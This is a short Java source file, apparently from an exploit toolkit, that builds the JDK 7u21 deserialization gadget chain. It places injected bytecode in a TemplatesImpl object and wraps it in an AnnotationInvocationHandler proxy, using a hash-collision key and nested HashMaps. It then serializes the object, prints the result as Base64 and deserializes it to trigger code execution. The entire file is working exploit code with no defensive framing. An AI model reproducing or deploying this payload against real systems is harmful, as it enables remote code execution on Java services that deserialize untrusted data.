package payload;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.tomcat.util.codec.binary.Base64;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class jdk7u21 {
    public static void main(String[] args) throws Exception {
//        byte[] evilCode = SerializeUtil.getEvilCode();
        byte[] templates1 = SerializeUtil.getTemplates();
        TemplatesImpl templates = new TemplatesImpl();

        SerializeUtil.setFieldValue(templates,"_name","EncryptionUtil");

        HashMap<String, Object> memberValues = new HashMap<String, Object>();
        memberValues.put("f5a5a608","feng");
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)cons.newInstance(Templates.class, memberValues);


        Templates proxy = (Templates) Proxy.newProxyInstance(
                Templates.class.getClassLoader(),
                new Class[]{Templates.class},
                handler
        );

        Map map1 = new HashMap();
        Map map2 = new HashMap();
        map1.put("yy",proxy);
        map1.put("zZ",templates);
        map2.put("yy",templates);
        map2.put("zZ",proxy);
        Map map = new HashMap();
        map.put(map1, 1);
        map.put(map2, 2);
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{templates1});

        byte[] bytes = SerializeUtil.serialize(map);
        System.out.println(Base64.encodeBase64String(bytes));
        SerializeUtil.unserialize(bytes);
    }
}
